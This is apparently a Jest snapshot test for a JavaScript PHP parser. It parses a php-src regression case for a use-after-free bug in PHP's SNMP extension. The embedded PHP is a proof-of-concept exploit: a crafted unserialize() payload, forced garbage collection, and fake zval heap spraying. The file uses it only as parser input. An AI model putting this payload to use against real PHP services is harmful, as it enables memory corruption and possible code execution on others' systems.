// eslint-disable prettier/prettier
const parser = require("../main");

describe("php-src tests", function () {
  // ext/snmp/tests/bug72479.phpt
  it("Bug #72479: Use After Free Vulnerability in SNMP with GC and unserialize()", function () {
    expect(parser.parseCode("<?php\n$arr = [1, [1, 2, 3, 4, 5], 3, 4, 5];\n$poc = 'a:3:{i:1;N;i:2;O:4:\"snmp\":1:{s:11:\"quick_print\";'.serialize($arr).'}i:1;R:7;}';\n$out = unserialize($poc);\ngc_collect_cycles();\n$fakezval = ptr2str(1122334455);\n$fakezval .= ptr2str(0);\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\n$fakezval .= \"\\x01\";\n$fakezval .= \"\\x00\";\n$fakezval .= \"\\x00\\x00\";\nfor ($i = 0; $i < 5; $i++) {\n    $v[$i] = $fakezval.$i;\n}\nvar_dump($out[1]);\nfunction ptr2str($ptr)\n{\n    $out = '';\n    for ($i = 0; $i < 8; $i++) {\n        $out .= chr($ptr & 0xff);\n        $ptr >>= 8;\n    }\n    return $out;\n}\n?>")).toMatchSnapshot();
  });
});
